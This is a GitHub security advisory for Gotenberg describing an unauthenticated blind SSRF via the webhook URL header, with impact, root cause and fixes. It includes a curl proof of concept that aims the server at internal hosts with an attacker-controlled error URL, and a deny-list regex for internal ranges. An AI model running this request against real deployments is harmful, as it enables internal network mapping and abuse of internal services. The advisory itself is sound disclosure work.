# [M] Gotenberg Vulnerable to Unauthenticated SSRF via Unfiltered Webhook URL

## Summary
Severity: Medium
Advisory: GHSA-5vh4-rgv7-p9g4
CVE: CVE-2026-39383
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-30
Source: https://github.com/advisories/GHSA-5vh4-rgv7-p9g4
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected >=8.29.1 <8.31.0

## Details
# CVE Report — Unauthenticated SSRF via Unfiltered Webhook URL in Gotenberg

## Severity

| Field     | Value                                  |
|-----------|----------------------------------------|
| CVSS v3.1 | **8.6 High**                           |
| Vector    | `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| CWE       | CWE-918 — Server-Side Request Forgery  |
| Auth      | None                                   |

**Affected:** Gotenberg 8.29.1 — default `gotenberg/gotenberg:8` Docker image.

---

## Impact

An unauthenticated attacker with network access to Gotenberg can force it to make outbound HTTP POST requests to any internal or external destination by supplying an arbitrary URL in the `Gotenberg-Webhook-Url` request header.

**This is a blind SSRF.** Gotenberg POSTs the converted document to the webhook URL and checks only whether the response status code is an error (>= 400). The response body from the SSRF target is never forwarded to the attacker. The `Gotenberg-Webhook-Error-Url` header — if supplied — receives the original converted PDF when the webhook POST fails, not the target's response body.

The practical impact is therefore:

- **Internal network probing:** if the error URL is NOT called, the target returned 2xx → host and port are open and accepting POST requests. If the error URL IS called, the target returned 4xx/5xx or timed out → port closed or service rejected the request. This allows mapping internal infrastructure one request at a time. 
- **Forced POST to internal services:** any internal service that performs a side effect on POST (triggering a webhook, writing state, executing a job) can be abused without reading its response.
- **Cloud metadata interaction:** Gotenberg can be forced to POST to `http://169.254.169.254/` — confirming reachability and probing available paths — but cannot read the credential response body through this channel alone.

The retryable client issues up to 4 automatic retries per request, meaning one attacker request generates up to 4 probes against the internal target.

---

## Proof of Concept

```bash
# Minimal SSRF trigger — replace ATTACKER_IP with your listener & INTERNAL_IP with the target.
curl -s -o /dev/null -w "HTTP:%{http_code}" \
  -X POST 'http://TARGET:3000/forms/chromium/convert/url' \
  -H 'Gotenberg-Webhook-Url: http://INTERNAL_IP:9999/capture' \
  -H 'Gotenberg-Webhook-Error-Url: http://ATTACKER_IP:9999/error' \
  -F 'url=https://example.com'
```

---

## Root Cause

`FilterDeadline` in `filter.go` is the intended URL gating function but its contract fails open: when both the allow and deny lists are empty (the default), it returns `nil` unconditionally, allowing any URL through.

```go
func FilterDeadline(allowed, denied []*regexp2.Regexp, s string, deadline time.Time) error {
    if len(allowed) > 0 { ... }  // skipped — empty by default
    if len(denied) > 0  { ... }  // skipped — empty by default
    return nil                    // any URL passes
}
```

The unvalidated URL is then stored verbatim and used as the destination for an outbound `retryablehttp` request in `client.go:62`.

---

## Recommendations 

**Gotenberg maintainers:** Invert the default — deny all webhook URLs unless an explicit allowlist is configured, or ship a built-in denylist covering RFC-1918 and link-local ranges.

**Operators (immediate):**
```bash
# Restrict to your own receiver
--env GOTENBERG_API_WEBHOOK_ALLOW_LIST="https://my-receiver\.example\.com/.*"
# Or block internal ranges
--env GOTENBERG_API_WEBHOOK_DENY_LIST="^https?://(169\.254\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)"
```

---

## Attribution

This is a Gotenberg-only issue. No third-party library is at fault. The root cause is an insecure default in `FilterDeadline` where an unconfigured state means "allow all" rather than "deny all".

---

## Timeline

| Date       | Event |
|------------|-------|
| 2026-04-04 | Vulnerability discovered |
| 2026-04-05 | SSRF confirmed — outbound POST captured at local listener |
| 2026-04-05 | Report drafted for disclosure |

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-5vh4-rgv7-p9g4
- https://nvd.nist.gov/vuln/detail/CVE-2026-39383
- https://github.com/gotenberg/gotenberg
- https://github.com/gotenberg/gotenberg/releases/tag/v8.31.0
